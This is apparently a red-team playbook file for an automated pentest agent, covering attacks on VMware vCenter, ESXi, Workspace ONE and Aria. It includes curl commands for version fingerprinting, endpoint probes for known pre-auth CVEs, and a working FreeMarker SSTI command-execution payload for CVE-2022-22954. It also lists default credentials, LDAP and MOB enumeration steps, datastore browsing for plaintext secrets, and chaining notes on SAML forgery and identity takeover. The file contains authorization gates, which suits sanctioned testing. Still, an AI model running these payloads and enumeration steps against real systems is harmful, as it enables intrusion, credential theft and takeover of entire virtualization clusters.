---
name: VMware vCenter & vSphere Attack Chain
description: External exploitation of VMware vCenter/ESXi/Workspace ONE/Aria — version fingerprinting, the high-impact pre-auth RCE CVE chain, default creds, SSO/vmdir/MOB enumeration, and API pivot to the virtualization plane.
tags: [vmware, vcenter, esxi, virtualization, pre-auth-rce, exploitation]
recommended_tools: [httpx_probe, nuclei_scan, http_request, curl, nmap_scan, python3, jq]
vuln_classes: []
domain: network
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/vmware-vcenter-attack/SKILL.md]}
---

# VMware vCenter & vSphere Attack Chain

VMware management-plane CVEs are overwhelmingly **pre-auth, network-reachable, and mass-exploited within days of patch**. When recon surfaces vCenter / ESXi / Workspace ONE / Aria at a current-minus-one patch level, that is a **Critical** finding (full virtualization-plane compromise), not a Medium info-disclosure.

## When to use

Trigger when recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`
- Ports: 443 (mgmt/UI/SDK), 5480 (VAMI appliance mgmt), 389/636 (vmdir LDAP), 427 (ESXi OpenSLP)

Flag pure ESXi hypervisor exposed without a management plane as a separate finding (different attack surface — OpenSLP on 427, not vCenter web CVEs).

---

## Step 1 — Version fingerprinting (lowest-noise initial probe)

```bash
TARGET="vcenter.target.com"

# Build info endpoint (often public; reveals exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/"      | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# TLS cert metadata (SAN leaks product/hostname; do this FIRST — no HTTP request needed)
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null \
  | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service + SAML metadata (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via Broadcom/VMware advisories (VMSA-YYYY-NNNN). Cross-check CISA KEV before grading severity — VMware is one of the most-represented vendors in the catalog.

`nuclei_scan` templates: `cve-2021-21972.yaml`, `cve-2022-22954.yaml`, `vmware-vcenter-*.yaml`. `nmap_scan` service detection on 443/5480/427/389 to confirm the management surface.

---

## Step 2 — External-exploitable CVE matrix (sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 (AD-joined) < patch | AD group "ESX Admins" auto-admin bypass | Critical — domain→ESXi root, ransomware-favorite |
| **CVE-2023-34048** | vCenter 7 < 7.0 U3o, 8 < 8.0 U1d/U2b | DCE/RPC pre-auth OOB write → RCE | Critical, APT (UNC3886) 0-day since 2021 |
| **CVE-2023-20887** | Aria Ops for Networks (vRNI) 6.2–6.10 | Pre-auth Thrift command injection → root | Critical, KEV |
| **CVE-2023-34063** | Aria Automation 8.11–8.14 | Missing access control, cross-org (CVSS 9.9) | Critical (auth'd) |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.08.x | Pre-auth auth bypass chained to auth'd RCE | Critical chained |
| **CVE-2022-22972** | Workspace ONE / IDM / vRA 7.6 | Host-header auth bypass → admin session | Critical, CISA ED 22-03 |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth FreeMarker SSTI → RCE | Critical, mass-exploited, KEV |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical, KEV |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin unauth file upload → RCE | Critical, mass-exploited, KEV |
| **CVE-2021-21974 / CVE-2020-3992** | ESXi 6.5/6.7/7.0 OpenSLP (427) | Pre-auth UAF / heap overflow → root | Critical, ESXiArgs ransomware |
| **CVE-2024-22273** | ESXi/vCenter storage controller | OOB read/write — requires **VM-local** access | Important (8.1), NOT external pre-auth |

Always verify patch level against the matching CVE before attempting any exploit primitive. Do NOT execute RCE/file-upload PoCs without explicit RCE-attempt sign-off — they create persistent webshells with cleanup and audit-trail cost.

---

## Step 3 — CVE-2021-21972 probe (vropspluginui unauth file upload → RCE)

Canonical pre-auth RCE. vRealize Operations plugin bundled with every default install; endpoint lacked any auth filter and `uploadova` did not sanitize archive entry paths (path traversal). On Windows write `webshell.jsp` under the vsphere-ui webroot (SYSTEM); on Linux drop `authorized_keys` into `/home/vsphere-ui/.ssh/` and SSH in.

```bash
# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
# 405 → endpoint exists, version vulnerable
# 404 → patched (endpoint removed)
# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

Reported by Mikhail Klyuchnikov (PT SWARM), VMSA-2021-0002 (2021-02-23), CISA KEV 2021-11-03. PoC available; mass-scanned within a day of release.

---

## Step 4 — CVE-2022-22954 probe (Workspace ONE FreeMarker SSTI → RCE)

Unauth GET injects a FreeMarker template via `deviceUdid`; `freemarker.template.utility.Execute` runs OS commands as the `horizon` service account. Single-request RCE.

```bash
# Stage A — detection only: reachability + baseline. No command execution.
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
# 404 → patched/removed. Keep the baseline body to diff against Stage B.

# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
```

**Gate — confirmed RCE ONLY if** the response contains the exact `$CANARY` echoed back AND `uid=` output that is absent from the Stage-A baseline (in-band command output, body-diff against baseline). A bare `uid=` with no canary echo is NOT confirmation. Then stop and report.

Reported by Steven Seeley (Source Incite), VMSA-2022-0011 (2022-04-06), KEV 2022-04-14; CISA AA22-138B documents real IR engagements exploited via this CVE. Follow-up bypasses: CVE-2022-22972 (Host-header auth bypass) and CVE-2022-31656/31659 (auth-bypass → auth'd RCE chain) hit the same product matrix — try them if 22954 is patched.

---

## Step 5 — Default credentials (frequently still valid on lab/staging)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| VCSA Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |
| Workspace ONE | `admin` | `<set>` |

**Do NOT spray vCenter SSO.** `administrator@vsphere.local` has an aggressive lockout (often 3 attempts → 60s, configurable to permanent). One high-confidence guess only; prefer creds discovered in breach corpora.

---

## Step 6 — SSO / vmdir LDAP enumeration

```bash
# SSO Admin endpoint / SAML metadata (frequently exposes domain info)
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Anonymous LDAP bind to vmdir (389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks topology

```bash
curl -skI "https://$TARGET/mob"
# 401 → auth required (good for the defender)
# 200 → MOB exposed → browse VMs/hosts/datastores/sessions without creds in some misconfigs

# Auth'd MOB walks the entire vSphere tree:
curl -sk -u 'administrator@vsphere.local:<pw>' \
  "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

Anonymously-accessible MOB is a **High** finding on its own (full topology disclosure).

---

## Step 8 — vSphere REST API enumeration (post-cred pivot)

```bash
# Mint a session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"   # → "<token>"

TOK="<token>"
curl -sk -H "vmware-api-session-id: $TOK" "https://$TARGET/api/vcenter/vm"
curl -sk -H "vmware-api-session-id: $TOK" "https://$TARGET/api/vcenter/host"
curl -sk -H "vmware-api-session-id: $TOK" "https://$TARGET/api/vcenter/datastore"

# Datastore file access — VMDK, snapshots, cloud-init secrets:
curl -sk -H "vmware-api-session-id: $TOK" \
  "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

Datastore browsing is the highest-value post-cred action: VMDK images, snapshots, and cloud-init/OVF property files routinely contain plaintext credentials. Pipe JSON responses through `jq` to inventory VMs/hosts programmatically.

---

## Step 9 — Product-specific paths

### Workspace ONE Access
```bash
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"
curl -sk "https://$TARGET/SAAS/login/0"
```

### Aria / vRealize
```bash
# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"
# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"
# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Step 10 — CVE-2024-37085 (ESXi "ESX Admins" AD bypass)

Requires an existing AD foothold, not pre-auth network. ESXi hard-trusts a group literally named `ESX Admins` and auto-grants every member full admin — without checking the group existed at join time. End-to-end: AD rights to create/re-create the group → add an account → SSH/API root on **every** domain-joined ESXi host → mass VM control/encryption. Ransomware operators (Storm-0506/Black Basta, Octo Tempest, Manatee Tempest) exploited it as a 0-day. VMSA-2024-0013 (2024-06-25), KEV 2024-07-30.

---

## Chaining notes

- **SAML/IdP:** Workspace ONE / VMware Identity Manager publishes SP metadata (`/SAAS/API/1.0/GET/metadata/idp.xml`) and consumes assertions at predictable ACS URLs → target the federating IdP with XSW assertion-forgery → forged assertion `userPrincipalName=administrator@vsphere.local` → vCenter-admin impersonation.
- **Pre-auth RCE → cluster control:** version fingerprint → confirm missing patch → matching CVE PoC → root on the vCenter appliance → mint an API session token → cluster-wide VM control.
- **Federated SSO:** if vCenter SSO AuthURL points at `login.microsoftonline.com`, ATO the synced `administrator@vsphere.local` identity in Entra and ride SAML into vCenter admin without ever touching vCenter's lockout-protected SSO.
- **ESXi ransomware vector:** OpenSLP CVEs (CVE-2021-21974 / CVE-2020-3992) on TCP/427 are the ESXiArgs pathway — root on the hypervisor directly, bypassing the vCenter web plane entirely.

---

## Severity guidance

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack-surface note) |
| vCenter on internet, missing patch with public RCE | **Critical** (virtualization-plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE unpatched 22954/22972 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + surface concentration) |

CWE mapping: CVE-2021-21972/22005 → CWE-434 (unrestricted upload) + CWE-22 (path traversal); CVE-2022-22954 → CWE-1336/CWE-94 (SSTI/code injection); CVE-2022-22972 → CWE-290 (auth bypass via Host header); CVE-2023-20887 → CWE-78 (OS command injection); CVE-2023-34048 → CWE-787 (OOB write).

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often.
- **DO NOT execute file-upload/RCE PoCs without explicit OK** — persistent webshells, cleanup + audit-trail cost.
- **DO NOT confuse ESXi-on-internet with vCenter** — different surfaces; OpenSLP CVEs target TCP/427.
- **DO NOT skip the TLS handshake banner check** — VMware leaks versions there; lowest-noise initial probe.

---

## Detection footprint (what SOC sees)

Excessive 404s on `/ui/vropspluginui/*`; POST to `/sdk` from non-management IP; `administrator@vsphere.local` auth failures; plugin upload to vRealize endpoint; `vmdird` crash immediately preceding backdoor deployment (CVE-2023-34048 forensic tell). vCenter/vSAN alerting is sensitive — expect patch/block within hours; capture a baseline before exploitation and treat any mid-test defensive change as a second finding.

## Key references

- Broadcom/VMware advisories: `support.broadcom.com/security-advisories` (search VMSA-YYYY-NNNN).
- CISA KEV (VMware filter) — grade severity against active-exploitation status.
- Mandiant/Google Cloud Threat Intel on UNC3886 — deepest forensic trail on long-tail vCenter 0-day exploitation.
